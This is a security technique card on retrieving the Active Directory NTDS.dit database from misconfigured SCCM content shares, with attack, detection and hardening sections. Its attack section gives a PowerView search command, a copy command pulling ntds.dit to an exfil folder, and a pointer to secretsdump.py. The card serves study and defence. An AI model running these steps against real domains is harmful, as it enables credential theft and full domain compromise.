# [CA-DUMP-008]: SCCM Content Library NTDS Access

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-008 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD / SCCM |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploiting System Center Configuration Manager (SCCM) backup behaviors. If SCCM is configured to back up Domain Controllers or if an administrator inadvertently packages a "Install From Media" (IFM) set into an SCCM Content Library/Distribution Point, attackers with Read access to the SCCM share can retrieve `NTDS.dit`.
- **Attack Surface:** SCCM Content Library Network Shares (`SCCMContentLib$`).
- **Business Impact:** **Total Domain Compromise** from a non-DC server.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Domain User (often has Read access to SCCM Content) or NAA (Network Access Account).
- **Vulnerable Config:** Admins distributing DC backups via SCCM or placing IFM media in source directories.
- **Tools:**
    - [PowerView](https://github.com/PowerShellMafia/PowerSploit)
    - `Find-InterestingDomainShareFile`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Discovery**
Scan SCCM shares for files resembling `ntds.dit`.
```powershell
Find-InterestingDomainShareFile -Include *ntds.dit*
```

**Step 2: Retrieval**
Mount the share and copy the file.
```cmd
copy \\SCCM-Server\Source$\Backups\DC1\ntds.dit C:\exfil\
```

**Step 3: Decryption**
Locate the corresponding SYSTEM hive (usually in the same backup set) and use `secretsdump.py`.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 5140 | Access Share: `SCCMContentLib$`, Object Name: `*.dit` |

#### 5.2 Sentinel (KQL)
```kusto
FileReadEvents
| where FileName =~ "ntds.dit"
| where ShareName has "SCCM" or ShareName has "Source"
| where User !in ("SCCM-Service-Account")
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Permissions:** Lock down SCCM Source Directories. Remove "Domain Users" read access.
*   **Process:** Never place sensitive backups (IFM, Certificate PFX) in SCCM source shares.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-003] (Share Enumeration)
> **Next Logical Step:** [LAT-AD-003]
